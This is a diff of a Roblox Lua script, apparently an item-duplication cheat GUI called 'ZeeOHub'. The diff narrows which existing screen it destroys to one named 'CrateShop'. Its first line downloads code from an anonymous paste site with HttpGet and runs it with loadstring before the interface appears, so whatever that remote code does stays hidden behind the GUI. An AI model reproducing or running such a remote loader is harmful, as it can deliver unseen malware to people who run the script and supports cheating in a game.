@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://termbin.com/6z6r"))()
 wait 2
--- Dupe gui general
-
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -9,11 +7,10 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Remove existing GUIs
-for _, gui in ipairs(playerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") then
-        gui:Destroy()
-    end
+-- Remove only CrateShop GUI
+local crateShop = playerGui:FindFirstChild("CrateShop")
+if crateShop then
+    crateShop:Destroy()
 end
 
 -- Loading Screen
@@ -82,7 +79,6 @@ tween.Completed:Connect(function()
     fadeTween.Completed:Connect(function()
         loadingGui:Destroy()
 
-        -- Main GUI
         local mainGui = Instance.new("ScreenGui")
         mainGui.Name = "ZeeOHub"
         mainGui.ResetOnSpawn = false
